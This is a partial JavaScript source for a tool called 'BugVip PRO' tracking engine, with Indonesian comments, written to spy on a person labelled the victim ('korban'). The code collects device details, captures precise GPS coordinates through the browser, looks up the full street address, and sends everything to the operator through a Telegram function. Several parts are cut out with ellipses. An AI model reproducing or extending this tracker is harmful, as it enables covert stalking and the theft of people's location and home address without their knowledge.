/**
 * BugVip PRO - HYBRID TRACKING ENGINE (FIXED GPS)
 * FULL VERSION - TIDAK SPAM, LINK MAPS AKURAT
 */
...
(function() {
    ...
    async function collectDeviceInfo() {
        let info = '╭───── BugVip TRACKING REPORT ───── ⦿\n\n';
        ...
        try {
            ...
            info += '❌ Gagal mendapatkan lokasi via IP\n';
        }
    ...
    function captureGPS() {
        ...
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                    ...
                    let gpsMsg = `📍 LOKASI AKURAT KORBAN\n`;
                    gpsMsg += `📌 Latitude: ${lat}\n`;
                    gpsMsg += `📍 Longitude: ${lon}\n`;
                    gpsMsg += `🎯 Akurasi: ${acc} meter\n`;
                    gpsMsg += `🗺️ Google Maps: ${mapLink}\n`;
                    
                    // Ambil alamat lengkap via Nominatim
                    try {
                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                        const data = await res.json();
                        if (data.address) {
                            gpsMsg += `🏠 Alamat: ${data.display_name || 'Tidak tersedia'}\n`;
                        }
                    } catch (e) {}
                    
                    await sendToTelegram(gpsMsg);
                    log('📍 GPS terkirim (1x)', 'success');
                },
                async (error) => {
